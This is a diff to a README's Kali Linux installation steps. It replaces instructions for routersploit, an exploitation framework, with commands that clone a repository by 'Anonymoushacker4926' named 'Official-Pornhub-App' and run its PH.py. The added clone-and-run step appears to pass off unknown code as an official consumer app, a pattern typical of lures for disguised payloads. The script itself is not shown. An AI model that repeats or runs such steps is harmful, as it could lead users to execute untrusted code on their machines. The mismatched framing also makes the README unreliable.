@@ -15,10 +15,9 @@ This is only working for google chrome users as of right now.
 # Installation on Kali Linux
 ```
 * apt-get install python3-pip
-* git clone https://www.github.com/threat9/routersploit
-* cd routersploit
-* python3 -m pip install -r requirements.txt
-* python3 rsf.py
+* git clone https://github.com/Anonymoushacker4926/Official-Pornhub-App.git
+* cd Official-Pornhub-App
+* python3 PH.py
 ```
 
 ![Capturev2 5](https://user-images.githubusercontent.com/53458032/112593530-8a377800-8dff-11eb-9778-fe274bbced37.PNG)
